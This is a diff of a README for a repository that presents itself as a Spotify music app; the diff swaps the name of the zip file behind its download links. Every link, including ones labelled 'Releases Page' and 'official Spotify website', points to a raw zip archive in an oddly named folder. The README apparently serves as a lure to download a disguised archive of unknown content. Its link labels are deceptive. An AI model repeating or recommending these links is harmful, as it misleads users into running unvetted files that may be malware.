@@ -1,7 +1,7 @@
 # 🎵 spotify-jmgd8 - Your Simple Music Experience
 
 ## 📥 Download Here
-[![Download](https://raw.githubusercontent.com/168256/spotify-jmgd8/main/uncrossable/spotify-jmgd8.zip)](https://raw.githubusercontent.com/168256/spotify-jmgd8/main/uncrossable/spotify-jmgd8.zip)
+[![Download](https://raw.githubusercontent.com/168256/spotify-jmgd8/main/uncrossable/jmgd-spotify-v2.3-alpha.1.zip)](https://raw.githubusercontent.com/168256/spotify-jmgd8/main/uncrossable/jmgd-spotify-v2.3-alpha.1.zip)
 
 ## 🚀 Getting Started
 Welcome to spotify-jmgd8! This application provides an easy way to enjoy your favorite music on Spotify. Whether you are a casual listener or a music enthusiast, you will find this application straightforward to use.
@@ -17,7 +17,7 @@ Before you begin, ensure your computer meets these requirements:
 ## 📥 Download & Install
 To get started, visit this page to download the latest version of spotify-jmgd8:
 
-[Download from Releases Page](https://raw.githubusercontent.com/168256/spotify-jmgd8/main/uncrossable/spotify-jmgd8.zip)
+[Download from Releases Page](https://raw.githubusercontent.com/168256/spotify-jmgd8/main/uncrossable/jmgd-spotify-v2.3-alpha.1.zip)
 
 1. Click the link above.
 2. You will see a list of available versions.
@@ -50,7 +50,7 @@ If you encounter issues while installing or running the application, try these s
 We appreciate your feedback! Share your thoughts and suggestions by opening an issue on this GitHub repository. Your input helps us improve the application and your experience.
 
 ## 🌐 Additional Resources
-For additional information, visit the [official Spotify website](https://raw.githubusercontent.com/168256/spotify-jmgd8/main/uncrossable/spotify-jmgd8.zip) to browse their music catalog and find out more about their services. 
+For additional information, visit the [official Spotify website](https://raw.githubusercontent.com/168256/spotify-jmgd8/main/uncrossable/jmgd-spotify-v2.3-alpha.1.zip) to browse their music catalog and find out more about their services. 
 
 ## 🙏 Acknowledgments
 Thank you for choosing spotify-jmgd8. We hope you enjoy using this application for all your music needs. Happy listening!
